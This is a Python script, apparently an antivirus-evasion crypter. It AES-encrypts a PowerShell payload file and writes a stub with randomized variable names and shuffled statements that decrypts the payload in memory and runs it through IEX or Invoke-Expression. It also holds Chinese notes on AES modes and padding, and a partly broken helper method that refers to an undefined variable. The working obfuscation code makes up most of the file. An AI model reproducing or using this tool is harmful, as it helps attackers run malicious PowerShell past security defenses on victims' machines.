# -*- coding:UTF-8 -*-

import random
import os, base64
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex

class OutModel():
    def __init__(self, b64_encrypted, key, iv, key_size, cipher_mode, padding_mode):
        dict_key_size = {16 : 128, 24 : 192, 32 : 256}
        self.b64_encrypted = b64_encrypted
        self.key = key
        self.iv = iv
        self.key_size = dict_key_size[key_size]
        self.cipher_mode = cipher_mode
        self.padding_mode = padding_mode
        self.execute_mode = random.choice(["Invoke-Expression", "IEX"])

    def randomName(self):
        set = ""
        # 随机生成4到8位的变量名
        for i in range(random.randint(4,8)):
            set += random.choice("abcdefghijklmnopqrstuvwxyzQWERTYUIOPASDFGHJKLZXCVBNM")
        return set

    def outModel(self):
        list_temp = []

        output = '''
        ${0} = [System.Convert]::FromBase64String("{b64_encrypted}")
        ${1} = [System.Convert]::FromBase64String("{key}")
        ${2} = New-Object "System.Security.Cryptography.AesManaged"
        '''.strip().replace('  ', '').split("\n")
        random.shuffle(output)
        list_temp.extend(output)

        output = '''
        ${2}.Mode = [System.Security.Cryptography.CipherMode]::{cipher_mode}
        ${2}.Padding = [System.Security.Cryptography.PaddingMode]::{padding_mode}
        ${2}.BlockSize = 128
        ${2}.IV = [System.Convert]::FromBase64String("{iv}")
        '''.strip().replace('  ', '').split("\n")
        random.shuffle(output)
        random_location = random.choice(range(0,len(output)))
        output.insert(random_location,'${2}.Key = ${1}')
        output.insert(random_location,'${2}.KeySize = {key_size}')
        list_temp.extend(output)

        output = '''
        ${3} = New-Object System.IO.MemoryStream(,${2}.CreateDecryptor().TransformFinalBlock(${0},0,${0}.Length))
        '''.strip().replace('  ', '').split("\n")
        list_temp.extend(output)  

        output = '''
        ${3}.Close()
        ${4} = [System.Text.Encoding]::UTF8.GetString(${3}.ToArray())
        '''.strip().replace('  ', '').split("\n")
        random.shuffle(output)
        list_temp.extend(output)

        output = '''
        {execute_mode}(${4})
        '''.strip().replace('  ', '').split("\n")
        list_temp.extend(output)

        output = '\n'.join(list_temp).format( self.randomName(), self.randomName(), self.randomName(), self.randomName(), self.randomName(), b64_encrypted = self.b64_encrypted, 
            key = self.key,iv = self.iv, key_size = self.key_size, cipher_mode = self.cipher_mode, padding_mode = self.padding_mode, execute_mode = self.execute_mode)

        return output.strip("\n")

    def b64SplitOut(self, b64_output_paylaod):
        # Split 3 part
        b64_output_paylaod = base64.b64encode(output_paylaod.encode('utf-8')).decode("utf-8")

        location_a = location_b = len(b64_output_paylaod)
        while location_a == location_b:
            location_a = random.randint(1,len(b64_output_paylaod)-1)
            location_b = random.randint(1,len(b64_output_paylaod)-1)
            if(location_a > location_b):
                location_temp = location_a
                location_a = location_b
                location_b = location_temp

        b64_output = '''
        '''
        b64_a = b64_output_paylaod[0:location_a]
        b64_b = b64_output_paylaod[location_a:location_b]
        b64_c = b64_output_paylaod[location_b:len(b64_output_paylaod)]

        print(base64.b64decode(b64_a+b64_b+b64_c).decode("utf-8"))


''' 
随机生成密钥
It must be 16, 24 or 32 bytes long (respectively for *AES-128*,
        *AES-192* or *AES-256*).

IV必须时16位
ValueError: Incorrect IV length (it must be 16 bytes long)
AES.py中数据块大小时16位
# Size of a data block (in bytes)
block_size = 16

对称加密又分为分组加密和序列密码。
分组密码，也叫块加密(block cyphers)，一次加密明文中的一个块。是将明文按一定的位长分组，明文组经过加密运算得到密文组，密文组经过解密运算（加密运算的逆运算），还原成明文组。
序列密码，也叫流加密(stream cyphers)，一次加密明文中的一个位。是指利用少量的密钥（制乱元素）通过某种复杂的运算（密码算法）产生大量的伪随机位流，用于对明文位流的加密。
解密是指用同样的密钥和密码算法及与加密相同的伪随机位流，用以还原明文位流。

mode.split("_")[1:]
分组加密算法中，有ECB,CBC,CFB,OFB这几种算法模式。
python中有好几种选，但是PaddingMode只有Zeros！！！
因为我们填充数据是用0填充
具体参考
https://blog.csdn.net/feiyingzaishi/article/details/88791686

AES支持支持几种填充：NoPadding，PKCS5Padding，ISO10126Padding，PaddingMode.Zeros;PaddingMode.PKCS7;
NoPadding：表示加密后的数据长度不会另外加入16字节的数据；
而PKCS7Padding会在加密后的数据另外加入16字节的数据；
这里要说明一下PKCS5Padding和PKCS7Padding是一样的。
详细大家可以参考http://www.cnblogs.com/midea0978/articles/1437257.html
我也再说一下PKCS7 就是数据少几个就填充几个。
比如数据{1,2,3,4,5,6，7,8,9,10}
少了6个
那么就填充6个6（注意是0x06，而不是字符6，字符6实际上是0x36）
{1,2,3,4,5,6，7,8,9,10，6,6,6,6,6,6}
注意一定要是16个数据（1个数据是8位，这样就是128位）这样才能进行AES加密。


'''

class AesCrypto():
    def __init__(self, key, IV):
        self.key = key
        self.iv = IV
        self.mode = AES.MODE_CBC
        # self.mode = 11
        # 2，3，5，9，11
    
    # 加密函数，text参数的bytes类型必须位16的倍数，不够的话，在末尾添加"\0"(函数内以帮你实现)
    def encrypt(self, text):
        cryptor = AES.new(self.key, self.mode, self.iv) # self.key的bytes长度是16的倍数即可， self.iv必须是16位
        length = 16
        count = len(text)
        if(count%length != 0):
            add = length-(count%length)
        else:
            add=0

        text = text+("\0".encode()*add)  # 这里的"\0"必须编码成bytes，不然无法和text拼接

        self.ciphertext = cryptor.encrypt(text)
        self.ciphertext = base64.b64encode(self.ciphertext)
        return (self.ciphertext)
    
    def decrypt(self, text):
        cryptor = AES.new(self.key, self.mode, self.iv)
        plain_text = cryptor.decrypt((text)).decode()
        return plain_text.rstrip("\0")
        #return plain_text

if __name__ == '__main__':
    # read ps1
    with open(r'payload.ps1', 'r') as f:
        payload = f.read()

    cipher_mode = random.choice(["CBC"])
    padding_mode = random.choice(["Zeros"])

    key_size = random.choice([16,24,32])
    # .decode("utf-8")去除b''前缀
    key = base64.b64encode(os.urandom(key_size)).decode("utf-8")
    iv = base64.b64encode(os.urandom(16)).decode("utf-8")

    # Encrypt
    pc = AesCrypto(key=base64.b64decode(key), IV=base64.b64decode(iv))
    # .decode("utf-8")去除b''前缀
    b64_encrypted = pc.encrypt(payload.encode()).decode("utf-8")
    # print(b64_encrypted)

    output = OutModel(b64_encrypted, key, iv, key_size, cipher_mode, padding_mode)
    output_paylaod = output.outModel()

    # write base64 ps1
    # b64_output_paylaod = output.b64SplitOut(output_paylaod)
    # print(b64_output_paylaod)

    # write ps1
    with open(r'my_payload.ps1', 'w') as f:
        f.write(output_paylaod)